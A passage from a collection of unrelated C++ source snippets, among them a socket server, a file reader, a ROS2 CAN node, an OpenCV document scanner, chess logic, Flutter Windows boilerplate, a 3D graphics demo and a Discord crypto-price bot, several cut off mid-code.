client\n\tUser\t\t\t\tuser; \n\tstruct sockaddr_in\tuserAdd;\n\tstruct pollfd\t\tnewPoll;\n\tsocklen_t \t\t\tlen = sizeof(userAdd);\n\t// accept the new client\n\tint newUserFd = accept(_serverFd, (sockaddr *)&(userAdd), &len); \n\tif (newUserFd == -1)\n  \t{\n\t\tstd::cout << \"accept() failed\" << std::endl; \n\t\treturn;\n\t}\n\t// set the socket option (O_NONBLOCK) for non-blocking socket\n\tif (fcntl(newUserFd, F_SETFL, O_NONBLOCK) == -1) \n\t{\n\t\tstd::cout << \"fcntl() failed\" << std::endl; \n\t\treturn;\n\t}\n\n\tnewPoll.fd = newUserFd;\t\t\t\t\t\t\t// add the client socket to the pollfd\n\tnewPoll.events = POLLIN;\t\t\t\t\t\t// set the event to POLLIN for reading data\n\tnewPoll.revents = 0;\t\t\t\t\t\t\t// set the revents to 0\n\n\tuser.setFd(newUserFd);\t\t\t\t\t\t\t// set the client file descriptor\n\tuser.setIpAdd(inet_ntoa((userAdd.sin_addr)));\t// convert the ip address to string and set it\n\t_users.push_back(user);\t\t\t\t\t\t\t// add the client to the vector of clients\n\t_fds.push_back(newPoll);\t\t\t\t\t\t// add the client socket to the pollfd\n\n\tstd::cout << GRE << \"User [\" << newUserFd << \"] Connected\" << WHI << std::endl;\n}\n\nvoid Server::configServerSocket()\n{\n\tstruct sockaddr_in\tserverAdd;\n\tstruct pollfd\t\tnewPoll;\n\tserverAdd.sin_family = AF_INET;\t\t\t\t// set the address family to ipv4\n\tserverAdd.sin_addr.s_addr = INADDR_ANY;\t\t// set the address to any local machine address\n\tserverAdd.sin_port = htons(this->_port);\t// convert the port to netwo",
    "#include \"IOManager.h\"\r\n\r\n#include <fstream>\r\n\r\n//-------------------------------------------------------------------\r\nbool AE::IOManager::readFileToBuffer(std::string filePath, \r\n\t\t\t\t                     std::vector<unsigned char>& buffer) \r\n//-----------------------------------\r\n{\r\n    std::ifstream file(filePath, std::ios::binary);\r\n    if (file.fail()) {\r\n        perror(filePath.c_str());\r\n        return false;\r\n    }\r\n\r\n    //seek to the end\r\n    file.seekg(0, std::ios::end);\r\n\r\n    //Get the file size\r\n    int fileSize = file.tellg();\r\n    file.seekg(0, std::ios::beg);\r\n\r\n    //Reduce the file size by any header bytes that might be present\r\n    fileSize -= file.tellg();\r\n\r\n    buffer.resize(fileSize);\r\n    file.read((char *)&(buffer[0]), fileSize);\r\n    file.close();\r\n\r\n    return true;\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nbool AE::IOManager::readFileToBuffer(std::string filePath, \r\n\t\t\t\t\t\t\t std::string& buffer)\r\n//-----------------------------------\r\n{\r\n    std::ifstream file(filePath, std::ios::binary);\r\n    if (file.fail()) {\r\n        perror(filePath.c_str());\r\n        return false;\r\n    }\r\n\r\n    //seek to the end\r\n    file.seekg(0, std::ios::end);\r\n\r\n    //Get the file size\r\n    int fileSize = file.tellg();\r\n    file.seekg(0, std::ios::beg);\r\n\r\n    //Reduce the file size by any header bytes that might be present\r\n    fileSize -= file.tellg();\r\n\r\n    buffer.resize(fileSize);\r\n    file.read((char *)&(buffer[0]), fileSize);\r\n    file.close();\r\n\r\n    return true;\r\n}\r\n\r\n",
    "#include \"can_transceiver/ros2can_transceiver.h\"\n\nusing namespace std::chrono_literals;\n\nTestNode::TestNode(): rclcpp::Node(\"test_node_canlib\"), canlib::Transceiver() {\n    // Use callbacks to customize the decoding of the incoming data\n    canlib::callback::rcv::can1::jetson_commands = [&](can1_jetson_commands_t /*frame_encoded*/){\n      RCLCPP_INFO(this->get_logger(), \"Hello from callback %lf\\n\", canlib::data.can1.jetson_commands.jetson_speed_target_left);\n    };\n\n    // Use a thread to continuously update the can messages\n    std::thread receiver([this](){\n      RCLCPP_INFO(this->get_logger(), \"starting CAN receiver ...\");\n      this->is_receiver_running = true;\n      while(rclcpp::ok()){\n        if(receive()){\n          RCLCPP_INFO(this->get_logger(), \"received data\");\n        }\n      }\n      RCLCPP_INFO(this->get_logger(), \"shutdown CAN receiver ...\");\n      this->is_receiver_running = false;\n    });\n\n    // Just for an example send contnuosly data\n    std::thread transmitter([this](){\n      RCLCPP_INFO(this->get_logger(), \"starting CAN transmitter ...\");\n      this->is_transmitter_running = true;\n      while(rclcpp::ok()){\n        transmit(canlib::frame::decoded::can1::jetson_commands_t(\n          0.1, \n          0.2, \n          0.3, \n          0.4, \n          0.5\n        ));\n        sleep(1);   \n      }\n      RCLCPP_INFO(this->get_logger(), \"shutdown CAN transmitter ...\");\n      this->is_transmitter_running = false;\n    });\n\n    receiver.detach();\n    transmitter.detach();\n    RCLCPP_INFO(this->get_logger(), \"init success\");\n}\n\nTestNode::~TestNode(){\n  RCLCPP_INFO(this->get_logger(), \"destructor called\");\n  while(is_receiver_running || is_transmitter_running){\n    if(is_receiver_running) RCLCPP_INFO(this->get_logger(), \"CAN receiver is still running\");\n    if(is_transmitter_running) RCLCPP_INFO(this->get_logger(), \"CAN transmitter is still running\");\n    sleep(1);\n  }\n}\n\nint main(int argc, char * argv[])\n{\n  rclcpp::init(argc, argv);\n  rclcpp::spin(std::make_shared<TestNode>());\n  rclcpp::shutdown();\n  return 0;\n}",
    "#include \"Scanner.hpp\"\n\nScanner::Scanner() {\n\tthis->cropped = false;\n};\n\nbool compareContourAreas(vector<Point> contour1, vector<Point> contour2){\n\tdouble i = fabs(contourArea(Mat(contour1)));\n\tdouble j = fabs(contourArea(Mat(contour2)));\n\treturn (i > j);\n}\n\nbool compareXCords(Point p1, Point p2){\n\treturn (p1.x < p2.x);\n}\n\nbool compareYCords(Point p1, Point p2){\n\treturn (p1.y < p2.y);\n}\n\nbool compareDistance(pair<Point, Point> p1, pair<Point, Point> p2){\n\treturn (norm(p1.first - p1.second) < norm(p2.first - p2.second));\n}\n\ndouble distance(Point p1, Point p2){\n\treturn sqrt(((p1.x - p2.x) * (p1.x - p2.x)) + ((p1.y - p2.y) * (p1.y - p2.y)));\n}\n\nvoid resizeToHeight(Mat src, Mat &dst, int height){\n\tSize s = Size(src.cols * (height / double(src.rows)), height);\n\tresize(src, dst, s, INTER_AREA);\n}\n\nvoid Scanner::orderPoints(vector<Point> inpts, vector<Point> &ordered){\n\tsort(inpts.begin(), inpts.end(), compareXCords);\n\tvector<Point> lm(inpts.begin(), inpts.begin()+2);\n\tvector<Point> rm(inpts.end()-2, inpts.end());\n\n\tsort(lm.begin(), lm.end(), compareYCords);\n\tPoint tl(lm[0]);\n\tPoint bl(lm[1]);\n\tvector<pair<Point, Point> > tmp;\n\n\tfor(size_t i = 0; i< rm.size(); i++){\n\t\ttmp.push_back(make_pair(tl, rm[i]));\n\t}\n\n\tsort(tmp.begin(), tmp.end(), compareDistance);\n\tPoint tr(tmp[0].second);\n\tPoint br(tmp[1].second);\n\n\tordered.push_back(tl);\n\tordered.push_back(tr);\n\tordered.push_back(br);\n\tordered.push_back(bl);\n}\n\nvoid Scanner::fourPointTransform(Mat src, Mat &dst, vector<Point> pts){\n\tvector<Point> orderedPts;\n\torderPoints(pts, orderedPts);\n\n\tdouble wa = distance(orderedPts[2], orderedPts[3]);\n\tdouble wb = distance(orderedPts[1], orderedPts[0]);\n\tdouble mw = max(wa, wb);\n\n\tdouble ha = distance(orderedPts[1], orderedPts[2]);\n\tdouble hb = distance(orderedPts[0], orderedPts[3]);\n\tdouble mh = max(ha, hb);\n\n\tPoint2f src_[] ={\n        Point2f(orderedPts[0].x, orderedPts[0].y),\n        Point2f(orderedPts[1].x, orderedPts[1].y),\n        Point2f(orderedPts[2].x, orderedPts[2].y),\n        Point2f(orderedPts[3].x, orderedPts[3].y),\n\t};\n\n\tPoint2f dst_[] ={\n        Point2f(0,0),\n        Point2f(mw-1, 0),\n        Point2f(mw-1, mh-1),\n        Point2f(0, mh-1)\n\t};\n\n\tMat m = getPerspectiveTransform(src_, dst_);\n\twarpPerspective(src, dst, m, Size(mw, mh), BORDER_REPLICATE, INTER_LINEAR);\n}\n\nvoid Scanner::processEdge(Mat input, Mat &output, int openKSize, int closeKSize, bool gaussianBlur){\n    Mat image_pp, structuringElmt;\n\tcvtColor(input, image_pp, COLOR_BGR2GRAY);\n\n\tif (openKSize > 0){\n\t\tstructuringElmt = getStructuringElement(MORPH_ELLIPSE, Size(openKSize,openKSize));\n\t\tmorphologyEx(image_pp, image_pp, MORPH_OPEN, structuringElmt);\n\t}\n\tif (closeKSize > 0){\n\t\tstructuringElmt = getStructuringElement(MORPH_ELLIPSE, Size(closeKSize,closeKSize));\n\t\tmorphologyEx(image_pp, image_pp, MORPH_CLOSE, structuringElmt);\n\t}\n\n\tif (gaussianBlur){\n\t\tGaussianBlur(image_pp, image_pp, Size(7,7), 0);\n\t}\n\tCanny(image_pp, output, 50, 60, 3, true);\n}\n\nvoid Scanner::process(Mat image, Mat &output){\n\tMat orig = image.clone();\n\n\tdouble ratio = image.rows / 500.0;\n\tresizeToHeight(image, image, 500);\n\n\tMat edged, edgedCache;\n\tprocessEdge(image, edged, 11, 11, true);\n\tedgedCache = edged.clone();\n\n\tvector<vector<Point>> contours, shapes;\n\tvector<Vec4i> hierarchy;\n\t\n\tfindContours(edged, contours, hierarchy, RETR_LIST, CHAIN_APPROX_SIMPLE);\n\tedged = Mat::zeros(Size(image.cols, image.rows), CV_8UC1);\n\n\tvector<vector<Point>> hull(contours.size());\n\tint sum_area = 0, mean_area = 0;\n\n\tfor(int i=0; i<contours.size(); i++){\n\t\tconvexHull(Mat(contours[i]), hull[i], false);\n\t\tsum_area += contourArea(Mat(hull[i]));\n\t}\n\tmean_area = sum_area / hull.size();\n\n\tfor(int i=0; i<hull.size(); i++){\n\t\tif(contourArea(Mat(hull[i])) >= mean_area){\n\t\t\tshapes.push_back(hull[i]);\n\t\t}\n\t}\n\tsort(shapes.begin(), shapes.end(), compareContourAreas);\t\n\n\tfor(int i=1; i<shapes.size(); i++){\n\t\tfor(int j=0; j<shapes[i].size(); j++)\n\t\t\tshapes[0].push_back(shapes[i][j]);\n\t}\n\n\tconvexHull(Mat(shapes[0]), hull[0], false);\n\tdrawContours(edged, hull, 0, 255, 2);\n\tfindContours(edged, contours, hierarchy, RETR_LIST, CHAIN_APPROX_SIMPLE);\n\n\tvector<vector<Point>> approx;\n\tapprox.resize(contours.size());\n\n\tfor(int i=0; i<contours.size(); i++){\n\t\tdouble peri = 0.01 * arcLength(contours[i], true);\n\t\tapproxPolyDP(contours[i], approx[i], peri, true);\n\t}\n\n\tfor(int i=0; i<approx.size(); i++){\n\t\tif(approx[i].size() == 4){\n\t\t\tfor(int j=0; j<approx[i].size(); j++)\n\t\t\t\tapprox[i][j] *= ratio;\n\n\t\t\tfourPointTransform(orig, output, approx[i]);\n\t\t\tthis->cropped = true;\n\t\t\treturn;\n\t\t}\n\t}\n\n\tprocessEdge(image, edgedCache, 11, 9, false);\n\n\tMat kernel = getStructuringElement(MORPH_RECT, Size(21,21));\n\tdilate(edgedCache, edgedCache, kernel);\n\n    normalize(edgedCache, edgedCache, 0, 255, NORM_MINMAX, CV_32F);\n\n\tint minX = edgedCache.cols, minY = edgedCache.rows;\n\tint maxX = 0, maxY = 1;\n\n\tfor (int i=0; i<edgedCache.rows; i++){\n\t\tfor (int j=0; j<edgedCache.cols; j++){\n\t\t\tif (edgedCache.at<float>(i,j) > 0){\n\t\t\t\tminX = j < minX ? j : minX;\n\t",
    "#include \"BaseFigure.h\"\n\nvoid Move::setMoveType(MoveType type, bool resetPreviousStates)\n{\n\tif (resetPreviousStates)\n\t{\n\t\tthis->type.reset();\n\t}\n\tthis->type.set(static_cast<int>(type));\n}\n\nmoveTypeMask Move::getMoveType() const\n{\n\treturn type;\n}\n\nvoid Move::setChessboardState(ChessboardState state)\n{\n\tthis->state.set(state);\n}\n\nboardStateMask Move::getChessboardState() const\n{\n\treturn state;\n}\n\nvoid Move::addUpdate(const Position& position, const std::shared_ptr<BaseFigure>& figure)\n{\n\tupdates.push_back({ position, figure });\n\tcancelingUpdates.insert(cancelingUpdates.begin(), { figure->getCurrentPosition(), figure });\n}\n\nconst std::vector<Update> Move::getUpdates() const\n{\n\treturn updates;\n}\n\nconst std::vector<Update> Move::getCancelingUpdates() const\n{\n\treturn cancelingUpdates;\n}\n\nvoid Move::clear()\n{\n\tupdates.clear();\n\tcancelingUpdates.clear();\n}\n\nBaseFigure::BaseFigure(const Position& currentPosition, const Color color)\n\t: currentPosition(currentPosition), color(color), moveId(0) {}\n\nBaseFigure::BaseFigure()\n\t: currentPosition(deletePosition), color(Color()), moveId(0) {}\n\nBaseFigure::~BaseFigure() {}\n\nint BaseFigure::generateKey(FigureType type, Color color)\n{\n\treturn 10 * static_cast<int>(color) + static_cast<int>(type);\n}\n\nint BaseFigure::getKey() const\n{\n\treturn generateKey(getFigureType(), getColor());\n}\n\nvoid BaseFigure::setNewState(const Position& newPosition)\n{\n\t++moveId;\n\tcurrentPosition = newPosition;\n}\n\nvoid BaseFigure::setColor(const Color color)\n{\n\tthis->color = color;\n}\n\nColor BaseFigure::getColor() const\n{\n\treturn color;\n}\n\nconst Position& BaseFigure::getCurrentPosition() const\n{\n\treturn currentPosition;\n}\n\nvoid BaseFigure::addMovementParameter(const Position& movementDelta, uint8_t movementParametrs)\n{\n\tmovementParameters.push_back(std::make_pair(movementDelta, movementParametrs));\n}\n\nvoid BaseFigure::restorePreviousState(const Position& oldPosition)\n{\n\tcurrentPosition = oldPosition;\n}\n\nMove BaseFigure::findChessBoardUpdates(std::shared_ptr<BaseFigure> const (&ChessBoard)[cagesCount][cagesCount], const Position& newPosition, bool ignoreSafeMoves)\n{\n\tMove updates;\n\tif (ChessBoard[newPosition.Row][newPosition.Column]->getFigureType() != FigureType::NullFigure)\n\t{\n\t\tupdates.addUpdate(deletePosition, ChessBoard[newPosition.Row][newPosition.Column]);\n\t\tupdates.setMoveType(MoveType::Capture);\n\t}\n\telse\n\t{\n\t\tupdates.setMoveType(MoveType::SimpleMove);\n\t}\n\tupdates.addUpdate(newPosition, ChessBoard[currentPosition.Row][currentPosition.Column]);\n\treturn updates;\n}\n\nstd::vector<Position> BaseFigure::findPossibleMovementsPositions(std::shared_ptr<BaseFigure> const (&ChessBoard)[cagesCount][cagesCount], bool onlyAttackMovements)\n{\n\tstd::vector<Position> movementsPositions;\n\tfor (auto idx = 0; idx < movementParameters.size(); ++idx)\n\t{\n\t\tauto delta = movementParameters[idx].first;\n\t\tauto parameters = movementParameters[idx].second;\n\t\tauto newPosition = currentPosition;\n\t\tdo\n\t\t{\n\t\t\tnewPosition = newPosition + delta;\n\t\t\tif (newPosition.isValidPosition(0, cagesCount - 1))\n\t\t\t{\n\t\t\t\tauto newFigure = ChessBoard[newPosition.Row][newPosition.Column];\n\t\t\t\tif (newFigure->getFigureType() != FigureType::NullFigure && newFigure->getColor() == color)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse if (newFigure->getFigureType() != FigureType::NullFigure && newFigure->getColor() != color)\n\t\t\t\t{\n\t\t\t\t\tif (parameters & MovementParameters::onlyAttackMovements)\n\t\t\t\t\t{\n\t\t\t\t\t\tmovementsPositions.push_back(newPosition);\n\t\t\t\t\t}\n\n\t\t\t\t\tif (parameters & MovementParameters::movementWithOneAttack)\n\t\t\t\t\t{\n\t\t\t\t\t\tmovementsPositions.push_back(newPosition);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (parameters & MovementParameters::onlyAttackMovements)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse if (!onlyAttackMovements)\n\t\t\t\t{\n\t\t\t\t\tmovementsPositions.push_back(newPosition);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t} while (parameters & MovementParameters::recursiveMovement);\n\t}\n\treturn movementsPositions;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <graphics.h>\n#include <math.h>\n#include <iostream>\nusing namespace std;\n// bar3d function in c\n// Declaration: void bar3d(int left, int top, int right, int bottom, int depth, int topflag);\n// bar3d function is used to draw a 2-dimensional, rectangular filled in bar .\n// Coordinates of left top and right bottom corner of bar are required to draw the bar.\n// left specifies the X-coordinate of top left corner, top specifies the Y-coordinate of top left corner,\n// right specifies the X-coordinate of right bottom corner, bottom specifies the Y-coordinate of right bottom corner,\n// depth specifies the depth of bar in pixels, topflag determines whether a 3 dimensional top is put on the bar or not\n//( if it's non-zero then it's put otherwise not ). Current fill pattern and fill color is used to fill the bar.\n// To change fill pattern and fill color use setfillstyle.\nvoid display(int x1, int y1, int x2, int y2, int z)\n{\n    int xmid = getmaxx() / 2;\n    int ymid = getmaxx() / 2;\n    line(xmid, 0, xmid, getmaxy());\n    line(0, ymid, getmaxx(), ymid);\n    bar3d(xmid + x1, ymid + y1, xmid + x2, ymid + y2, z, 1);\n}\nvoid translate(int x1, int y1, int x2, int y2, int z, int tx, int ty, int tz)\n{\n    outtextxy(100, 100, \"Before Translation:\");\n    display(x1, y1, x2, y2, z);\n    delay(3000);\n    cleardevice();\n    outtextxy(100, 100, \"After Translation:\");\n    display(x1 + tx, y1 + ty, x2 + tx, y2 + ty, z + tz);\n}\nvoid scale(int x1, int y1, int x2, int y2, int z, float sx, float sy, float sz)\n{\n    outtextxy(100, 100, \"Before Scaling:\");\n    display(x1, y1, x2, y2, z);\n    delay(3000);\n    cleardevice();\n    outtextxy(100, 100, \"After Scaling:\");\n    display(x1 * sx, y1 * sy, x2 * sx, y2 * sy, z * sz);\n}\nvoid xrotate(int x1, int y1, int x2, int y2, int z, float a)\n{\n    //\tx' = x\n    //\ty' = ycosA - zsinA\n    //\tz' = ysinA + zcosA\n    a = a * (3.1415 / 180);\n    float c = cos(a);\n    float s = sin(a);\n    outtextxy(100, 100, \"Before Rotation:\");\n    display(x1, y1, x2, y2, z);\n    delay(3000);\n    cleardevice();\n    outtextxy(100, 100, \"After Rotation:\");\n    display(x1, y1 * c - z * s, x2, y2 * c - z * s, ((y1 + y2) / 2) * s + z * c);\n}\nvoid yrotate(int x1, int y1, int x2, int y2, int z, float a)\n{\n    //\tx' = xcosA + zsinA\n    //\ty' = y\n    //\tz' = zcosA + xsinA\n    a = a * (3.1415 / 180);\n    float c = cos(a);\n    float s = sin(a);\n    outtextxy(100, 100, \"Before Rotation:\");\n    display(x1, y1, x2, y2, z);\n    delay(3000);\n    cleardevice();\n    outtextxy(100, 100, \"After Rotation:\");\n    display(x1 * c + z * s, y1, x2 * c + z * s, y2, z * c - ((x1 + x2) / 2) * s);\n}\nvoid zrotate(int x1, int y1, int x2, int y2, int z, float a)\n{\n    //\tx' = xcosA - ysinA\n    //\ty' = xsinA + ycosA\n    //\tz' = z\n    a = a * (3.1415 / 180);\n    float c = cos(a);\n    float s = sin(a);\n    outtextxy(100, 100, \"Before Rotation:\");\n    display(x1, y1, x2, y2, z);\n    delay(3000);\n    cleardevice();\n    outtextxy(100, 100, \"After Rotation:\");\n    display(x1 * c - y1 * s, x1 * s + y1 * c, x2 * c - y2 * s, x2 * s + y2 * c, z);\n}\nint main()\n{\n    int x1, y1, x2, y2, z;\n    int gd = DETECT, gm;\n    cout << \"Enter the coordinates of the digonal points of 3D object: x1, y1, x2, y2, z:\" << endl;\n    cin >> x1 >> y1 >> x2 >> y2 >> z;\n    while (1)\n    {\n        int ch;\n        cout << \"Enter Your Choice:\" << endl\n             << \"1-Translation\" << endl\n             << \"2-Scaling\" << endl\n             << \"3-Rotation about X-axis\" << endl\n             << \"4-Rotation about Y-axis\" << endl\n             << \"5-Rotation about Z-axis\" << endl\n             << \"0-EXIT\" << endl;\n        cin >> ch;\n        if (ch == 1)\n        {\n            int tx, ty, tz;\n            cout << \"Enter tx, ty, and tz:\" << endl;\n            cin >> tx >> ty >> tz;\n            initgraph(&gd, &gm, NULL);\n            translate(x1, y1, x2, y2, z, tx, ty, tz);\n            getch();\n            closegraph();\n        }\n        else if (ch == 2)\n        {\n            float sx, sy, sz;\n            cout << \"Enter Sx, Sx, and Sz:\" << endl;\n            cin >> sx >> sy;\n            initgraph(&gd, &gm, NULL);\n            scale(x1, y1, x2, y2, z, sx, sy, sz);\n            getch();\n            closegraph();\n        }\n        else if (ch == 3)\n        {\n            float a;\n            cout << \"Enter Angle:\" << endl;\n            cin >> a;\n            initgraph(&gd, &gm, NULL);\n            xrotate(x1, y1, x2, y2, z, a);\n            getch();\n            closegraph();\n        }\n        else if (ch == 4)\n        {\n            float a;\n            cout << \"Enter Angle:\" << endl;\n            cin >> a;\n            initgraph(&gd, &gm, NULL);\n            yrotate(x1, y1, x2, y2, z, a);\n            getch();\n            closegraph();\n        }\n        else if (ch == 5)\n        {\n            float a;\n            cout << \"Enter Angle:\" << endl;\n            cin >> a;\n            initgraph(&gd, &gm, NULL);\n            zrotate(x1, y1, x2, y2, z, a);\n            getch();\n            closegraph();\n        }\n     ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"bot_mgr.h\"\n#include \"coin_mgr.h\"\n\ndpp::cluster bot(\"****************\");//replace with discord bot token\n\nbot_mgr::bot_mgr()\n{\n    bot.on_log(dpp::utility::cout_logger());\n    auto mgr = coin_mgr();\n    \n    /* The interaction create event is fired when someone issues your commands */\n    bot.on_interaction_create([this, &mgr](const dpp::interaction_create_t & event)\n    {\n        auto cmd_name = event.command.get_command_name();\n\n        if (!cmd_name.compare(\"gas\")) this->gas(event, mgr);\n\n        else \n        {\n            if (cmd_name == std::string(\"price\"))\n                cmd_name = std::get<std::string>(event.get_parameter(\"crypto\"));\n\n            std::transform(cmd_name.begin(), cmd_name.end(), cmd_name.begin(), toupper);\n            this->coin(event, cmd_name, mgr);\n        }\n    });\n \n    bot.on_ready([this, &mgr](const dpp::ready_t & event) {\n        if (dpp::run_once<struct register_bot_commands>())\n        {\n            const uint64_t time_to_tick = 300;\n\n            dpp::timer_callback_t callback = [&mgr](dpp::timer)\n            {\n                mgr.tick();\n            };\n\n            if (!setup)\n                bot.start_timer(callback, time_to_tick);\n\n            this->setup_cmds();\n        }\n    });\n\n    bot.start(false);\n}\n\nvoid bot_mgr::setup_cmds()\n{\n    if (!setup)\n    {\n        /* Create a new global command on ready event */\n        dpp::slashcommand btc(\"btc\", \"Get the current Bitcoin price\", bot.me.id);\n        dpp::slashcommand eth(\"eth\", \"Get the current Ethereum price\", bot.me.id);\n        dpp::slashcommand gas(\"gas\", \"Get the current Ethereum gas price\", bot.me.id);\n        dpp::slashcommand shib(\"shib\", \"Get the current Shiba Inu price\", bot.me.id);\n        dpp::slashcommand price(\"price\", \"Get the current price of a cryptocurrency\", bot.me.id);\n\n        price.add_option(dpp::command_option(dpp::co_string, \"crypto\", \"Cryptocurrency\", true));\n\n        /* Register the command */\n        //bot.global_command_create(btc);//Only need to register once\n        //bot.global_command_create(eth);\n        //bot.global_command_create(gas);\n        //bot.global_command_create(shib);\n        //bot.global_command_create(price);\n\n        setup = true;\n    }\n\n}\n\nvoid bot_mgr::gas(const dpp::interaction_create_t& e, coin_mgr& mgr)\n{   \n    